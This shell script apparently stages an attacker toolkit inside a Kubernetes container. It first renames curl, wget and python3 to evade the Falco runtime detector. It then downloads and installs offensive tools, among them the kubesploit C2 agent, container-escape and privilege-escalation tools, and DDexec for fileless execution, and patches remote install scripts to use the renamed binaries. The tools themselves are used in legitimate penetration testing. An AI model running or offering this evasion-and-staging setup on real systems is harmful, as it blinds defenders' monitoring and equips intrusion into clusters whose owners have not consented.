#Simple Bypass Falco
mv /usr/bin/python3 /usr/bin/pton3 \
    && mv /usr/bin/curl /usr/bin/kurl \
    && mv /usr/bin/wget /usr/bin/vget;

# Install botb
kurl -s https://api.github.com/repos/brompwnie/botb/releases/latest | grep "browser_download_url.*linux-amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install botb-linux-amd64 /usr/local/bin/botb \
    && rm -rf botb-linux-amd64;

# Install traitor
kurl -s  https://api.github.com/repos/liamg/traitor/releases/latest | grep "browser_download_url.*-amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install traitor-amd64 /usr/local/bin/traitor \
    && rm -rf traitor-amd64;

# Install kubeletctl
kurl -s  https://api.github.com/repos/cyberark/kubeletctl/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install kubeletctl_linux_amd64 /usr/local/bin/kubeletctl \
    && rm -rf kubeletctl_linux_amd64*;

# Install kubesploit C2 agent
kurl -s  https://api.github.com/repos/cyberark/kubesploit/releases/latest | grep "browser_download_url.*-Linux-x64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && 7z x kubesploitAgent-Linux-x64.7z -r kubesploitAgent-Linux-x64 -pkubesploit \
    && install kubesploitAgent-Linux-x64 /usr/local/bin/kubesploit \
    && rm -rf kubesploit*;

# Install CDK
kurl -s  https://api.github.com/repos/cdk-team/CDK/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install cdk_linux_amd64 /usr/local/bin/cdk \
    && rm -rf cdk_linux_amd64*;

# Install peirates
kurl -s  https://api.github.com/repos/inguardians/peirates/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && tar -xJf peirates-linux-amd64.tar.xz \
    && install peirates-linux-amd64/peirates /usr/local/bin/ \
    && rm -rf peirates-linux-amd64*;

# Install ctrsploit
kurl -s  https://api.github.com/repos/ctrsploit/ctrsploit/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install ctrsploit_linux_amd64 /usr/local/bin/ctrsploit \
    && rm -rf ctrsploit_linux_amd64*;

# Install kdigger
kurl -s  https://api.github.com/repos/quarkslab/kdigger/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install kdigger-linux-amd64 /usr/local/bin/kdigger \
    && rm -rf kdigger-linux-amd64*;

# Install kubectl
kurl -LO https://storage.googleapis.com/kubernetes-release/release/`kurl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl \
    && mv kubectl k \
    && install ./k /usr/local/bin/ \
    && rm ./k;

#Install amicontained
kurl -s  https://api.github.com/repos/genuinetools/amicontainerd/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install amicontained-linux-amd64 /usr/local/bin/amicontained \
    && rm -rf ./amicontained-linux-amd64;

#Install linuxprivchecker
kurl -LO https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py \
    && install ./linuxprivchecker.py /usr/local/bin \
    && rm -rf linuxprivchecker.py;

#Install unix-privesc-checker
kurl -L http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz \
    | tar -xz \
    && install unix-privesc-check*/unix-privesc-check /usr/local/bin/ \
    && rm -rf unix-privesc-check*;

#Install deepce
kurl https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh > deepce.sh \
    && sed -i 's/wget/vget/g' deepce.sh \
    && sed -i 's/curl/kurl/g' deepce.sh \
    && sed -i 's/python3/pton3/g' deepce.sh \
    && chmod +x deepce.sh \
    && install ./deepce.sh /usr/local/bin \
    && rm -rf deepce.sh;

#Install helm
kurl https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3 > get_helm.sh \
    && sed -i 's/wget/vget/g' get_helm.sh \
    && sed -i 's/curl/kurl/g' get_helm.sh \
    && chmod 700 get_helm.sh \
    && ./get_helm.sh \
    && rm ./get_helm.sh;

#Install kube-hunter
kurl -s  https://api.github.com/repos/aquasecurity/kube-hunter/releases/latest | grep "browser_download_url.*-linux-x86" |  cut -d : -f 2,3 | tr -d \" | vget -qi - -O kube-hunter \
    && install kube-hunter /usr/local/bin/kube-hunter \
    && rm ./kube-hunter;

#Install kubescape
kurl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh > kubescape_install.sh \
    && sed -i 's/curl/kurl/g' kubescape_install.sh \
    && chmod 700 kubescape_install.sh \
    && ./kubescape_install.sh \
    && rm ./kubescape_install.sh;

#Install kube-bench
kurl -s  https://api.github.com/repos/aquasecurity/kube-bench/releases/latest | grep "browser_download_url.*_linux_amd64.deb" |  cut -d : -f 2,3 | tr -d \" | vget -qi - -O kube-bench.deb \
    && dpkg -i kube-bench.deb \
    && rm -f kube-bench.deb;

#Install etcdctl
kurl -s  https://api.github.com/repos/etcd-io/etcd/releases/latest | grep "browser_download_url.*-linux-amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - -O etcd.tar.gz \
    mkdir -p etcd-latest && tar -xzvf etcd.tar.gz -C etcd-latest --strip-components=1 \
    && cp etcd-latest/etcdctl /usr/local/bin \
    && chmod +x /usr/local/bin/etcdctl \
    && rm -rf etcd*;

#Install DDexec
kurl -LO https://raw.githubusercontent.com/arget13/DDexec/main/ddexec.sh \
    && chmod +x ddexec.sh \
    && install ddexec.sh /usr/local/bin/ddexec.sh \
    && rm ./ddexec.sh;

# Install kubetcd
kurl -s  https://api.github.com/repos/nccgroup/kubetcd/releases/latest | grep "browser_download_url.*_linux_amd64" |  cut -d : -f 2,3 | tr -d \" | vget -qi - \
    && install kubetcd_linux_amd64 /usr/local/bin/kubetcd \
    && rm ./kubetcd_linux_amd64;